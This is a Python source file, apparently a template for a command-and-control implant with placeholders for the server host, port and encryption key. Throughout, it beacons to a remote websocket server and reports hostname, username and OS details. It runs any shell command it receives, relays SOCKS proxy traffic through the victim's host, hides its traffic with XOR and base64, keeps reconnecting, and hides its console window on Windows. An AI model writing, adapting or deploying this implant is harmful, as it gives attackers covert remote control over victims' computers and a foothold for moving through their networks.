#!/usr/bin/env python3
import asyncio
import websockets
import json
import platform
import subprocess
import os
import getpass
import socket
import base64
import sys

SERVER_HOST = "{{C2_HOST}}"
SERVER_PORT = {{C2_PORT}}
RECONNECT_DELAY = 5
BEACON_MODE = {{BEACON_MODE}}
BEACON_INTERVAL = {{BEACON_INTERVAL}}


def simple_encrypt(data: str) -> str:
    """XOR encryption"""
    key = b'{{ENCRYPTION_KEY}}'
    encoded = data.encode()
    encrypted = bytes([encoded[i] ^ key[i % len(key)] for i in range(len(encoded))])
    return base64.b64encode(encrypted).decode()


def simple_decrypt(data: str) -> str:
    """XOR decryption"""
    key = b'{{ENCRYPTION_KEY}}'
    decoded = base64.b64decode(data.encode())
    decrypted = bytes([decoded[i] ^ key[i % len(key)] for i in range(len(decoded))])
    return decrypted.decode()


def get_metadata():
    """Gather system metadata"""
    return {
        'hostname': socket.gethostname(),
        'username': getpass.getuser(),
        'os': platform.system(),
        'os_version': platform.version(),
        'architecture': platform.machine(),
        'python_version': platform.python_version()
    }


def execute_command(command: str) -> str:
    """Execute system command and return output"""
    try:
        if command.startswith('cd '):
            directory = command[3:].strip()
            os.chdir(directory)
            return f"Changed directory to {os.getcwd()}"

        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=30,
            cwd=os.getcwd()
        )

        output = result.stdout + result.stderr
        return output if output else "Command executed successfully (no output)"

    except subprocess.TimeoutExpired:
        return "Command timeout"
    except Exception as e:
        return f"Error: {str(e)}"


async def heartbeat(websocket):
    """Send periodic heartbeat"""
    while True:
        try:
            message = {'type': 'heartbeat'}
            encrypted = simple_encrypt(json.dumps(message))
            await websocket.send(encrypted)
            await asyncio.sleep(10)
        except:
            break


async def socks_proxy_handler(websocket, host: str, port: int):
    """Handle SOCKS proxy connection"""
    try:
        reader, writer = await asyncio.open_connection(host, port)

        async def relay_to_server():
            try:
                while True:
                    data = await reader.read(4096)
                    if not data:
                        break
                    msg = {
                        'type': 'socks_data',
                        'data': base64.b64encode(data).decode()
                    }
                    encrypted = simple_encrypt(json.dumps(msg))
                    await websocket.send(encrypted)
            except:
                pass

        return relay_to_server, writer

    except Exception as e:
        return None, None


async def connect_to_server():
    """Main agent connection loop"""
    uri = f"ws://{SERVER_HOST}:{SERVER_PORT}"
    socks_relay_task = None
    socks_writer = None
    current_mode = 'beacon' if BEACON_MODE else 'streaming'
    beacon_interval = BEACON_INTERVAL

    while True:
        try:
            async with websockets.connect(uri, max_size=10485760) as websocket:
                metadata = get_metadata()
                metadata['mode'] = current_mode
                metadata['beacon_interval'] = beacon_interval

                register_msg = {
                    'type': 'register',
                    'metadata': metadata
                }
                encrypted = simple_encrypt(json.dumps(register_msg))
                await websocket.send(encrypted)

                response = await websocket.recv()
                decrypted = simple_decrypt(response)
                reg_data = json.loads(decrypted)

                if reg_data.get('type') == 'registered':
                    agent_id = reg_data.get('agent_id')
                    heartbeat_task = None

                    if current_mode == 'streaming':
                        heartbeat_task = asyncio.create_task(heartbeat(websocket))

                    async for message in websocket:
                        try:
                            decrypted = simple_decrypt(message)
                            data = json.loads(decrypted)

                            if data.get('type') == 'command':
                                command = data.get('command', '')
                                output = execute_command(command)

                                response = {
                                    'type': 'response',
                                    'output': output
                                }
                                encrypted_response = simple_encrypt(json.dumps(response))
                                await websocket.send(encrypted_response)

                                if current_mode == 'beacon':
                                    await asyncio.sleep(beacon_interval)

                            elif data.get('type') == 'set_interval':
                                beacon_interval = data.get('interval', beacon_interval)

                            elif data.get('type') == 'upgrade_mode':
                                current_mode = 'streaming'
                                if heartbeat_task is None:
                                    heartbeat_task = asyncio.create_task(heartbeat(websocket))

                                mode_msg = {
                                    'type': 'mode_change',
                                    'mode': 'streaming'
                                }
                                encrypted_msg = simple_encrypt(json.dumps(mode_msg))
                                await websocket.send(encrypted_msg)

                            elif data.get('type') == 'downgrade_mode':
                                current_mode = 'beacon'
                                beacon_interval = data.get('interval', beacon_interval)
                                if heartbeat_task:
                                    heartbeat_task.cancel()
                                    heartbeat_task = None

                                mode_msg = {
                                    'type': 'mode_change',
                                    'mode': 'beacon'
                                }
                                encrypted_msg = simple_encrypt(json.dumps(mode_msg))
                                await websocket.send(encrypted_msg)

                            elif data.get('type') == 'socks_init':
                                pass

                            elif data.get('type') == 'socks_connect':
                                host = data.get('host')
                                port = data.get('port')
                                relay_coro, socks_writer = await socks_proxy_handler(websocket, host, port)
                                if relay_coro:
                                    socks_relay_task = asyncio.create_task(relay_coro())

                            elif data.get('type') == 'socks_send':
                                if socks_writer:
                                    socks_data = base64.b64decode(data.get('data', ''))
                                    socks_writer.write(socks_data)
                                    await socks_writer.drain()

                        except Exception as e:
                            pass

                    if heartbeat_task:
                        heartbeat_task.cancel()
                    if socks_relay_task:
                        socks_relay_task.cancel()
                    if socks_writer:
                        socks_writer.close()
                        await socks_writer.wait_closed()

        except Exception as e:
            pass

        await asyncio.sleep(RECONNECT_DELAY)


if __name__ == '__main__':
    if sys.platform == 'win32':
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass

    try:
        asyncio.run(connect_to_server())
    except KeyboardInterrupt:
        pass
